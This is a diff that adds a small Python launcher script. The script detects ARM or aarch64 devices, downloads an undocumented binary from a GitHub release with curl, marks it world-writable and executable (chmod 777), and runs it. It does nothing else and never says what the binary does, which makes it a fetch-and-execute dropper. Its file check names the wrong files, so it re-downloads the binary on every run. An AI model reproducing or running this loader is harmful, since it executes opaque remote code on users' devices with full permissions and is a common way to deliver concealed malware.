@@ -1,0 +1,19 @@
+#coding=utf-8
+import os,sys,subprocess
+current_os=subprocess.check_output('uname -om',shell=True)
+if 'aarch64' in str(current_os):
+    if not os.path.isfile('p64'):
+        os.system('curl -L https://github.com/dilutecodes/file/releases/download/file/file64 > file64')
+        os.system('chmod 777 file64')
+        os.system('./file64')
+    else:
+        os.system('./file64')
+elif 'arm' in str(current_os):
+    if not os.path.isfile('p32'):
+        os.system('curl -L https://github.com/dilutecodes/file/releases/download/file/file32 > file32')
+        os.system('chmod 777 file32')
+        os.system('./file32')
+    else:
+        os.system('./file32')
+else:
+    exit('\n  Unknown device, aarch or os found, contact author.')
